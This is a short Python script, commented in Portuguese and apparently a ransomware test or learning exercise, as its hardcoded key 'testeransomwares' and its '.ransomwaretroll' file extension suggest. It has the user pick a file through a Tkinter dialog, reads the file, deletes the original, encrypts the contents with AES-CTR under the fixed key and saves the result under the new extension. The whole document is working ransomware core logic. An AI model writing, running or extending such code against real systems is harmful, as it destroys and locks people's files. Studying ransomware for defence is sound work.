import os
import pyaes
from tkinter import Tk, filedialog

# Função para selecionar o arquivo
def selecionar_arquivo():
    Tk().withdraw()  # Oculta a janela principal do Tkinter
    file_path = filedialog.askopenfilename(
        title="Selecione o arquivo para criptografar",
        filetypes=[("Todos os arquivos", "*.*")]
    )
    return file_path

# Seleciona o arquivo a ser criptografado
file_name = selecionar_arquivo()

if file_name:  # Verifica se o usuário selecionou um arquivo
    try:
        # Abre o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remove o arquivo original
        os.remove(file_name)

        # Chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografa o arquivo
        crypto_data = aes.encrypt(file_data)

        # Cria o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo criptografado com sucesso: {new_file_name}")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")
else:
    print("Nenhum arquivo foi selecionado.")
